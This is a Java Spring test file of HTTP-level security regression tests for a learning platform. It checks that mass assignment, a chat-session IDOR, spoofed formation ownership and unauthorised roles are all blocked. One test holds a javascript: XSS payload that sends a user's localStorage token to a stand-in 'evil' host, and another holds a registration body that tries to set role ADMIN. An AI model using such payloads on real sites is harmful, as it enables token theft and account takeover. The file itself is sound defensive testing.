package com.example.LearnAssist.Controllers;

import com.example.LearnAssist.Authentification.InstructorAuthenticationController;
import com.example.LearnAssist.Authentification.ParticipantAuthenticationController;
import com.example.LearnAssist.Dto.CreateFormationRequest;
import com.example.LearnAssist.Dto.RegisterParticipantRequest;
import com.example.LearnAssist.Exceptions.ResourceNotFoundException;
import com.example.LearnAssist.Models.Participant;
import com.example.LearnAssist.Services.ChatSessionServices;
import com.example.LearnAssist.Services.FormationServices;
import com.example.LearnAssist.Services.InstructorServices;
import com.example.LearnAssist.Services.ParticipantServices;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;

import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * HTTP-level regression tests for the Phase 1 findings, running through the real
 * SecurityConfig, Jackson binding and Bean Validation.
 */
@WebMvcTest(controllers = {
        ParticipantAuthenticationController.class,
        InstructorAuthenticationController.class,
        ChatSessionController.class,
        FormationController.class
})
class Phase1SecurityWebTest extends SecuredWebMvcTestSupport {

    @Autowired
    MockMvc mockMvc;

    @MockitoBean
    ParticipantServices participantServices;
    @MockitoBean
    InstructorServices instructorServices;
    @MockitoBean
    ChatSessionServices chatSessionServices;
    @MockitoBean
    FormationServices formationServices;
    @MockitoBean
    AuthenticationManager authenticationManager;

    private static final String VALID_PARTICIPANT = """
            {"id": 42, "role": "ADMIN", "status": "active", "profilePhoto": "x.png",
             "firstName": "Eve", "lastName": "Attacker", "phone": "+216 12345678",
             "email": "eve@x.com", "password": "Password1", "city": "Tunis",
             "confirmPassword": "Password1"}
            """;

    // ---- B-01: account takeover through mass assignment -------------------------------

    @Test
    void registrationIgnoresClientSuppliedIdRoleAndStatus() throws Exception {
        Participant created = new Participant();
        created.setId(1000L);
        created.setEmail("eve@x.com");
        when(participantServices.registerParticipant(any())).thenReturn(created);
        when(participantRepository.existsByEmail("eve@x.com")).thenReturn(true);
        when(participantRepository.findByEmail("eve@x.com")).thenReturn(Optional.of(created));
        var principal = new User("eve@x.com", "x", List.of(new SimpleGrantedAuthority("ROLE_PARTICIPANT")));
        when(authenticationManager.authenticate(any()))
                .thenReturn(new UsernamePasswordAuthenticationToken(principal, null, principal.getAuthorities()));
        when(jwtUtils.generateTokenFromUsername(any())).thenReturn("token");

        mockMvc.perform(post("/api/participant/register")
                        .contentType(MediaType.APPLICATION_JSON).content(VALID_PARTICIPANT))
                .andExpect(status().isOk());

        // The controller receives a DTO that has no id/role/status field at all, so the
        // values sent by the client cannot reach the entity.
        ArgumentCaptor<RegisterParticipantRequest> dto = ArgumentCaptor.forClass(RegisterParticipantRequest.class);
        verify(participantServices).registerParticipant(dto.capture());
        assertThat(dto.getValue().getEmail()).isEqualTo("eve@x.com");
        assertThat(RegisterParticipantRequest.class.getDeclaredFields())
                .extracting("name")
                .doesNotContain("id", "role", "status", "profilePhoto");
    }

    @Test
    void registrationRejectsInvalidPayloadWith400() throws Exception {
        String invalid = """
                {"firstName": "", "lastName": "B", "phone": "1", "email": "not-an-email",
                 "password": "short", "city": "Tunis"}
                """;

        mockMvc.perform(post("/api/participant/register")
                        .contentType(MediaType.APPLICATION_JSON).content(invalid))
                .andExpect(status().isBadRequest());
        mockMvc.perform(post("/api/instructor/register")
                        .contentType(MediaType.APPLICATION_JSON).content(invalid))
                .andExpect(status().isBadRequest());

        verifyNoInteractions(participantServices, instructorServices);
    }

    // ---- B-03: chat sessions IDOR -----------------------------------------------------

    @Test
    @WithMockUser(username = "b@x.com", roles = "PARTICIPANT")
    void participantGets404ForASessionOfAnotherParticipant() throws Exception {
        when(chatSessionServices.getMessagesBySessionId(5L, "b@x.com"))
                .thenThrow(new ResourceNotFoundException("Session not found"));

        mockMvc.perform(get("/api/sessions/5")).andExpect(status().isNotFound());
        verify(chatSessionServices).getMessagesBySessionId(eq(5L), eq("b@x.com"));
    }

    @Test
    @WithMockUser(username = "b@x.com", roles = "PARTICIPANT")
    void listingEverySessionOfEveryParticipantIsNoLongerPossible() throws Exception {
        mockMvc.perform(get("/api/sessions")).andExpect(status().is4xxClientError());
        verifyNoInteractions(chatSessionServices);
    }

    @Test
    void sessionsRequireAuthentication() throws Exception {
        mockMvc.perform(get("/api/sessions/list")).andExpect(status().isUnauthorized());
    }

    // ---- B-02 / F-01: formation creation ----------------------------------------------

    @Test
    @WithMockUser(username = "owner@x.com", roles = "INSTRUCTOR")
    void formationOwnerComesFromTheAuthenticatedUserNotTheBody() throws Exception {
        when(formationServices.addFormation(any(), any(), any(), any())).thenReturn(7L);
        MockMultipartFile formation = jsonPart("""
                {"id": 1, "title": "Spring", "emailInstructor": "victim@x.com",
                 "rate": 5, "formationStatus": "published"}
                """);

        mockMvc.perform(multipart("/api/formations").file(formation)).andExpect(status().isOk());

        verify(formationServices).addFormation(any(CreateFormationRequest.class), isNull(), isNull(), eq("owner@x.com"));
        assertThat(CreateFormationRequest.class.getDeclaredFields())
                .extracting("name")
                .doesNotContain("id", "emailInstructor", "rate", "formationStatus", "imageFileName", "videoFileName");
    }

    @Test
    @WithMockUser(username = "owner@x.com", roles = "INSTRUCTOR")
    void formationWithJavascriptVideoUrlIsRejected() throws Exception {
        MockMultipartFile formation = jsonPart("""
                {"title": "Spring", "videoUrl": "javascript:fetch('//evil/?t='+localStorage.userToken)"}
                """);

        mockMvc.perform(multipart("/api/formations").file(formation)).andExpect(status().isBadRequest());
        verifyNoInteractions(formationServices);
    }

    @Test
    @WithMockUser(username = "p@x.com", roles = "PARTICIPANT")
    void participantCannotCreateFormation() throws Exception {
        mockMvc.perform(multipart("/api/formations").file(jsonPart("{\"title\": \"Spring\"}")))
                .andExpect(status().isForbidden());
        verifyNoInteractions(formationServices);
    }

    private static MockMultipartFile jsonPart(String json) {
        return new MockMultipartFile("formation", "", MediaType.APPLICATION_JSON_VALUE,
                json.getBytes(StandardCharsets.UTF_8));
    }
}
